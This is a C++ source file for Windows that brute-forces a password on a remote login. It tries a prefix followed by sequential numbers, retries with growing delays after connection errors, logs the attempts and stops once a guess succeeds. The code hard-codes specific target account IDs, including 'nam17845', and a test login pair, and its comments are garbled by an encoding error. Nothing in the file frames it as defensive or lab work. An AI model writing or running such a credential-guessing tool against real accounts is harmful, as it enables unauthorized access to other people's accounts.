#include "keygenSequenceNumber.h"
#include <windows.h>
#include <stdio.h>

// n���� m
void SeqNumberEntry(char * targetId, char * prefixString, int beginNumber, int endNumber)
{
	char tryPassword[MAX_PASSWORD], writeBufferStr[LOGGING_BUFFER];
	int queryResult, i, remainRetry;

	// test
	strcpy_s(g_id, MAX_ID, "namo");						// set to global var(�Ķ����)
	queryResult = requestPassword("siroot");			// �˻��õ�
	printf("TEST NAMO\t%d\n", queryResult);		// ������
	Sleep(500);

	strcpy_s(g_id, MAX_ID, targetId);			// set to global var(�Ķ����)
	for(i=beginNumber; i<=endNumber; i++)
	{
		wsprintf(tryPassword, "%s%d", prefixString, i);	// �˻��� ���ڿ� ����
		remainRetry = RETRY_CONNECT;					// �õ� Ƚ�� �ʱ�ȭ
		do {
			queryResult = requestPassword(tryPassword);		// �˻��õ�
			printf("%s\t%d\n", tryPassword, queryResult);	// ������

			if(TRUE == queryResult || CONNECT_ERROR == queryResult) return;	// ��÷ or ������� ����
			else if(EXCEPT_ERROR == queryResult) {			// �������
				// �α� ���
				wsprintf(writeBufferStr,"[keygen Module]\r\n%s\t%d\r\n\r\n", tryPassword, queryResult);
				writeLog(writeBufferStr);
				remainRetry--;
				Sleep(RETRY_WAIT_SECOND*1000*(RETRY_CONNECT-remainRetry+1));
			}
			else break;
		} while(remainRetry);
		if(remainRetry <= 0) return;						// ��õ� ȸ�� �ʰ�
	}
}

// 1���� ��
void SeqNumberEntry(char * targetId, char * prefixString)
{
	SeqNumberEntry(targetId, prefixString, MIN_SERCHING_NUMBER, MAX_SERCHING_NUMBER);
}

// n���� ��
void SeqNumberEntry(char * targetId, char * prefixString, int beginNumber)
{
	SeqNumberEntry(targetId, prefixString, beginNumber, MAX_SERCHING_NUMBER);
}

// id ���� version
void SeqNumberEntry(char * prefixString)
{
	SeqNumberEntry("nam17845", prefixString);
}
void SeqNumberEntry(char * prefixString, int beginNumber)
{
	SeqNumberEntry("nam17845", prefixString, beginNumber);
}

void SeqNumberEntry(char * prefixString, int beginNumber, int endNumber)
{
	SeqNumberEntry("nam17845", prefixString, beginNumber, endNumber);
}
